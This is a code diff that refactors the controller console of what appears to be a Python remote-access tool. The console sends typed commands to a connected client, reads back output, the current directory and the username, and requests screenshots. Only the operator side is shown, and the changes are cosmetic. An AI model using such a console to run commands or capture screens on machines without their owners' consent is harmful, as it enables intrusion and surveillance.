@@ -15,8 +15,7 @@ def beautify_terminal_take_command(whoami,cwd):
     print(colored(f"📁 [{cwd}]",'blue',attrs=['dark']),end=" at ⏳ ")
     print(colored(f"[{datetime.now().strftime('%H:%M:%S')}]",'magenta'))
     print(colored("# ",'red'),end="")
-    cmd=input().strip()
-    return cmd
+    return input().strip()
 
 def recieve_screenshot(client_con,):
     client_con.send("screenshot".encode())
@@ -50,20 +49,18 @@ def send_commands(client_con):
         subprocess.run('cls')
     else:
         subprocess.run('clear')
-        
+
     while True:
         try:
             cmd=beautify_terminal_take_command(whoami,cwd)
-            # if only the length of command is more than 0 then it only goes , otherwise it loop is contineued
-            if len(str.encode(cmd))>0:
-                if cmd=='screenshot':
-                    progress,cwd,whoami=recieve_screenshot(client_con)
-                else:
-                    client_con.send(str.encode(cmd))
-                # Recieve the response and why are we seaparting you may ask because we are sending togther varios data ! 
-                    results,cwd,whoami=client_con.recv(bufferSize).decode().split(Separator)
-            else:
+            if len(str.encode(cmd)) <= 0:
                 continue
+            if cmd=='screenshot':
+                progress,cwd,whoami=recieve_screenshot(client_con)
+            else:
+                client_con.send(str.encode(cmd))
+                # Recieve the response and why are we seaparting you may ask because we are sending togther varios data ! 
+                results,cwd,whoami=client_con.recv(bufferSize).decode().split(Separator)
             if cmd.lower()=='quit':
                 # conditon to break connection 
                 break
